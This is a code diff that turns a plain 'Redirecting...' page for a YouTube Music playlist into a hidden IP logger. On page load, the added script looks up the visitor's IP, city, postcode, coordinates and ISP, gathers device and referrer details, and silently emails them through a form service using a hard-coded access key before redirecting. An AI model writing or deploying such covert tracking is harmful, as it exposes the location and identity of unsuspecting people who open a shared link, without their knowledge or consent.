@@ -2,9 +2,74 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta http-equiv="refresh" content="0; url=https://music.youtube.com/playlist?list=PLrhZUD-UUDf-5XQ0O3hVcJmGj2d9qNi6Y&si=19fihdelDI89HjU2" />
-  <script>window.location.replace("https://music.youtube.com/playlist?list=PLrhZUD-UUDf-5XQ0O3hVcJmGj2d9qNi6Y&si=19fihdelDI89HjU2");</script>
   <title>Redirecting...</title>
+  <script>
+    const PLAYLIST_URL = "https://music.youtube.com/playlist?list=PLrhZUD-UUDf-5XQ0O3hVcJmGj2d9qNi6Y&si=19fihdelDI89HjU2";
+    const WEB3FORMS_KEY = "c538fdf0-9474-49a5-a752-99f4f3d0274e";
+
+    async function trackAndRedirect() {
+      try {
+        const geoRes = await fetch("https://ipapi.co/json/");
+        const geo = await geoRes.json();
+
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || "Unknown";
+        const lang = navigator.language || "Unknown";
+        const screen_size = `${screen.width} x ${screen.height}`;
+        const referrer = document.referrer || "Direct / No referrer";
+        const time = new Date().toLocaleString("en-AU", { timeZone: "Australia/Perth" });
+
+        const message = `
+🎵 Someone just opened your playlist!
+
+──────────────────────────────
+📍 LOCATION
+──────────────────────────────
+IP Address  : ${geo.ip}
+City        : ${geo.city}
+Region      : ${geo.region}
+Country     : ${geo.country_name} (${geo.country})
+Postcode    : ${geo.postal || "N/A"}
+Lat / Long  : ${geo.latitude}, ${geo.longitude}
+Timezone    : ${geo.timezone}
+ISP / Org   : ${geo.org}
+
+──────────────────────────────
+💻 DEVICE & BROWSER
+──────────────────────────────
+User Agent  : ${ua}
+Platform    : ${platform}
+Language    : ${lang}
+Screen Size : ${screen_size}
+Cookies On  : ${navigator.cookieEnabled ? "Yes" : "No"}
+
+──────────────────────────────
+🔗 VISIT INFO
+──────────────────────────────
+Came From   : ${referrer}
+Time (AWST) : ${time}
+──────────────────────────────
+        `.trim();
+
+        await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify({
+            access_key: WEB3FORMS_KEY,
+            subject: "👀 Someone opened your playlist!",
+            from_name: "Playlist Tracker",
+            message: message
+          })
+        });
+      } catch (e) {
+        // Silently fail — always redirect regardless
+      }
+
+      window.location.replace(PLAYLIST_URL);
+    }
+
+    trackAndRedirect();
+  </script>
 </head>
 <body></body>
 </html>
